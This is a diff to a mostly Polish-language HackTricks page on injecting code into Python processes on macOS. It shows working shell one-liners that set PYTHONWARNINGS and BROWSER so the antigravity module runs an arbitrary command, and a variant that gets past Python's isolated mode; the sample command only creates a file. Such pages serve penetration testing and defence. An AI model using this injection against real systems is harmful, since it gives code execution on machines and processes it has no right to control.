@@ -1,22 +1,21 @@
-# Iniekcja aplikacji Python w macOS
+# macOS Python Application Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Za pośrednictwem zmiennych środowiskowych `PYTHONWARNINGS` i `BROWSER`
+## Za pomocą zmiennych środowiskowych `PYTHONWARNINGS` i `BROWSER`
 
-Możliwe jest zmodyfikowanie obu zmiennych środowiskowych w celu wykonywania dowolnego kodu za każdym razem, gdy wywoływany jest Python, na przykład:<sup>[[1]](#references)</sup>
+Jeśli atakujący może kontrolować środowisko procesu Python, połączenie zmiennych `PYTHONWARNINGS` i `BROWSER` może uruchomić wykonywanie poleceń, gdy Python importuje moduł `antigravity` podczas przetwarzania spreparowanej opcji ostrzeżenia. Technika ta opiera się na otwieraniu adresu URL przez `antigravity` za pomocą modułu Python `webbrowser`, który uwzględnia zmienną środowiskową `BROWSER`.<sup>[[1]](#references)</sup>
 ```bash
-# Generate example python script
+# Generate an example Python script.
 echo "print('hi')" > /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks
+# Create /tmp/hacktricks through the inherited environment.
 PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
+# With isolated mode, inject the warning rule using -W instead.
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
-## Odnośniki
+## References
 
-- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
-
+- [1] [Hacking ze zmiennymi środowiskowymi - elttam](https://www.elttam.com/blog/env/)
 {{#include ../../../banners/hacktricks-training.md}}
